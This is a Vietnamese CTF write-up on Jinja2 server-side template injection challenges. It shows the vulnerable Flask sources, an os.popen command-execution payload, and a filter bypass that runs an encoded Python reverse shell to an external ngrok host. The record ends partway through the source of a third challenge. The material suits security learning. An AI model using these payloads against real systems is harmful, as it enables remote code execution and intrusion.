<!-- auto-generated by QWER -->
<script lang="ts">
  /* eslint-disable @typescript-eslint/ban-ts-comment */
  // @ts-nocheck
  import Post from '$lib/layouts/post.svelte';
  import ImgZoom from '$lib/components/image_zoom.svelte';
  import Video from '$lib/components/video.svelte';
  import CodeCopy from '$lib/components/code_copy.svelte';
  import InfoBox from '$lib/components/info_box.svelte';
</script>

<Post>
  <article slot="post_content">
    <h1 id="ssti-golf"><a href="#ssti-golf">SSTI Golf</a></h1>
    <p>Đề bài cho thẳng source có lỗi SSTI như sau</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-python">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token comment">#!/usr/bin/env python3</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'text/plain'</span><span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/ssti'</span><span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token keyword">def</span> <span class="token function">ssti</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    query <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span> <span class="token keyword">if</span> <span class="token string">'query'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args <span class="token keyword">else</span> <span class="token string">'...'</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">48</span><span class="token punctuation">:</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        <span class="token keyword">return</span> <span class="token string">"Too long!"</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>query<span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span></div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      Check param <code class="inline-code-block">query</code>
      tại
      <code class="inline-code-block">/ssti</code>
       và giới hạn độ dài là 48. Bài này thì easy rồi nên mình cho thẳng payload mình hay dùng.
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-python">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token punctuation">{</span><span class="token punctuation">{</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'nl *'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179644681-16ad9d92-6c4c-4e2f-896a-46d4e4f950a8.png"
        alt="image" />
    </p>
    <h1 id="minigolf"><a href="#minigolf">minigolf</a></h1>
    <p>
      Một bài SSTI khác nhưng lần này khó hơn ở chỗ tác giả đã filter thêm một số ký tự <code class="inline-code-block">
        &lcub&lcub
      </code>
      <code class="inline-code-block">[</code>
      <code class="inline-code-block">_</code>
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-python">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token keyword">import</span> html</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"{{"</span><span class="token punctuation">,</span> <span class="token string">"}}"</span><span class="token punctuation">,</span> <span class="token string">"["</span><span class="token punctuation">,</span> <span class="token string">"]"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">]</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  <span class="token keyword">print</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  <span class="token keyword">if</span> <span class="token string">"txt"</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    txt <span class="token operator">=</span> html<span class="token punctuation">.</span>escape<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">"txt"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token punctuation">[</span>n <span class="token keyword">in</span> txt <span class="token keyword">for</span> n <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">      <span class="token keyword">return</span> <span class="token string">"Not allowed."</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>txt<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">69</span><span class="token punctuation">:</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">      <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>txt<span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    <span class="token keyword">else</span><span class="token punctuation">:</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">      <span class="token keyword">return</span> <span class="token string">"Too long."</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'text/plain'</span><span class="token punctuation">)</span></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span></div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      Ban đầu mình cũng cố gắng chắp vá payload bằng những cách thường dùng như dùng <code class="inline-code-block">
        attrundefined
      </code>
      <code class="inline-code-block">dict</code>
       nhưng độ dài là rất ít (&lt;= 69).
    </p>
    <p>
      Sau một hồi thì mình có tham khảo được trang <a
        href="https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/"
        rel="external">
        này
      </a>
    </p>
    <p>
      Đại khái ý tưởng ở đây sẽ là chèn một chuỗi với độ dài tuỳ thích vào một biến nào đó trong file <code
        class="inline-code-block">
        config
      </code>
      , sau đó ta sẽ
      <code class="inline-code-block">popen</code>
      tới nó để sử dụng. Mình test thử nhé. Đầu tiên ta sẽ lưu chuỗi như ý muốn vào
      <code class="inline-code-block">config.a</code>
    </p>
    <p>Ban đầu mình thử với payload sau nhưng không được</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code>{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">?txt={%set t=config.update(a=request.args('a')))%}&amp;a=this is a test mtiennnnn</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      Mình không hiểu tại sao payload này lại không work :) (có ai biết chỉ mình với nha), sau đó mình cho hẳn cái <code
        class="inline-code-block">
        request.args
      </code>
       thành một biến khác thì lại work.
    </p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-python">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token punctuation">{</span><span class="token operator">%</span><span class="token builtin">set</span> o<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span><span class="token builtin">set</span> b<span class="token operator">=</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span>a<span class="token operator">=</span>o<span class="token punctuation">.</span>t<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token operator">&amp;</span>t<span class="token operator">=</span>this <span class="token keyword">is</span> a test mtiennnnn</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      Đọc thử <code class="inline-code-block">config.a</code>
       thì đã thấy chuỗi mình nhập
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179645383-e56b8dfc-e37a-4b05-a2f1-d91fdebfe75f.png"
        alt="image" />
    </p>
    <p>Vậy là đạt được mục đích rồi, giờ chỉ cần set up reverse shell nữa là xong</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-python">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token punctuation">{</span><span class="token operator">%</span><span class="token builtin">set</span><span class="token operator">%</span>20o<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span><span class="token builtin">set</span><span class="token operator">%</span>20b<span class="token operator">=</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span>a<span class="token operator">=</span>o<span class="token punctuation">.</span>t<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token operator">&amp;</span>t<span class="token operator">=</span>python3<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>27import<span class="token operator">%</span>20socket<span class="token operator">%</span>2Csubprocess<span class="token operator">%</span>2Cos<span class="token operator">%</span>3Bs<span class="token operator">%</span>3Dsocket<span class="token punctuation">.</span>socket<span class="token operator">%</span>28socket<span class="token punctuation">.</span>AF_INET<span class="token operator">%</span>2Csocket<span class="token punctuation">.</span>SOCK_STREAM<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3Bs<span class="token punctuation">.</span>connect<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">28</span><span class="token string">"0.tcp.ap.ngrok.io"</span><span class="token operator">%</span>2C14474<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3Bos<span class="token punctuation">.</span>dup2<span class="token operator">%</span>28s<span class="token punctuation">.</span>fileno<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>2C0<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3B<span class="token operator">%</span>20os<span class="token punctuation">.</span>dup2<span class="token operator">%</span>28s<span class="token punctuation">.</span>fileno<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>2C1<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3B<span class="token operator">%</span>20os<span class="token punctuation">.</span>dup2<span class="token operator">%</span>28s<span class="token punctuation">.</span>fileno<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>2C2<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3Bp<span class="token operator">%</span>3Dsubprocess<span class="token punctuation">.</span>call<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">5</span><span class="token string">B"%2Fbin%2Fsh"</span><span class="token operator">%</span>2C<span class="token string">"-i"</span><span class="token operator">%</span>5D<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3B<span class="token operator">%</span><span class="token number">27</span></div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      Check lại <code class="inline-code-block">config.a</code>
       lần nữa cho chắc
    </p>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179646144-de31d54a-441f-4893-baec-304beed007ee.png"
        alt="image" />
    </p>
    <p>Oke popen nó là ta có thể rce được rồi</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-python">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"><span class="token punctuation">{</span><span class="token operator">%</span><span class="token builtin">set</span> o<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span><span class="token builtin">set</span> b<span class="token operator">=</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>o<span class="token punctuation">.</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>config<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token operator">&amp;</span>t<span class="token operator">=</span>__globals__</div></div>`}</code></pre>
      </CodeCopy>
    </div>
    <p>
      <ImgZoom
        src="https://user-images.githubusercontent.com/75429369/179646491-6aa503cd-b5ea-49ab-b92c-572f3a32baab.png"
        alt="image" />
    </p>
    <p><em>Note: bài này mình cứ ghi thiếu ngoặc với thiếu kí tự gì đấy nên cứ 500 miết =))</em></p>
    <h1 id="1337"><a href="#1337">1337</a></h1>
    <p>Mình đã không giải ra bài này trong lúc diễn ra giải nhưng nhiều thứ mình đã học được và muốn chia sẻ.</p>
    <div class="code-block  ">
      <CodeCopy>
        <pre><code
            class="language-javascript">{@html String.raw`<div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">import mojo from "@mojojs/core";</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">import Path from "@mojojs/path";</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">const toLeet = {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  A: 4,</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  E: 3,</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  G: 6,</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  I: 1,</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  S: 5,</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  T: 7,</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  O: 0,</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">};</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">const fromLeet = Object.fromEntries(</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  Object.entries(toLeet).map(([k, v]) =&gt; [v, k])</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">);</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">const layout = &#96;&lt;!DOCTYPE html&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;html lang="en"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;head&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;meta charset="UTF-8"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;title&gt;1337&lt;/title&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;link rel="stylesheet" href="static/style.css"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/head&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;body&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;main&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        &lt;%== ctx.content.main %&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;/main&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;canvas width="500" height="200" id="canv" /&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;script src="static/matrix.js"&gt;&lt;/script&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/body&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/html&gt;&#96;;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">const indexTemplate = &#96;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;h1&gt;C0NV3R7 70/FR0M L337&lt;/h1&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;form id="leetform" action="/"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;input type="text" id="text" name="text" placeholder="Your text here"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;div class="switch-field"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        &lt;input type="radio" id="dir-to" name="dir" value="to" checked="checked"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        &lt;label for="dir-to"&gt;TO&lt;/label&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        &lt;input type="radio" id="dir-from" name="dir" value="from"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        &lt;label for="dir-from"&gt;FROM&lt;/label&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;/div&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    &lt;input type="submit" value="SUBMIT"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/form&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;div id="links"&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  &lt;a href="/source"&gt;/source&lt;/a&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  &lt;a href="/docker"&gt;/docker&lt;/a&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&lt;/div&gt;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">&#96;;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">const app = mojo();</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">const leetify = (text, dir) =&gt; {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  const charBlocked = ["'", "&#96;", '"'];</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  const charMap = dir === "from" ? fromLeet : toLeet;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  const processed = Array.from(text)</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    .map((c) =&gt; {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">      if (c.toUpperCase() in charMap) {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        return charMap[c.toUpperCase()];</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">      }</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">      if (charBlocked.includes(c)) {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">        return "";</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">      }</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">      return c;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    })</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">    .join("");</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">  return &#96;&lt;h1&gt;&#36;{processed}&lt;/h1&gt;&lt;a href="/"&gt;â†BACK&lt;/a&gt;&#96;;</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">};</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content"></div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span class="no-line-diff"></span></div><div class="code-content">app.get("/", async (ctx) =&gt; {</div></div><div class="code-line"><div class="code-linenotation"><span class="no-line-number"></span><span 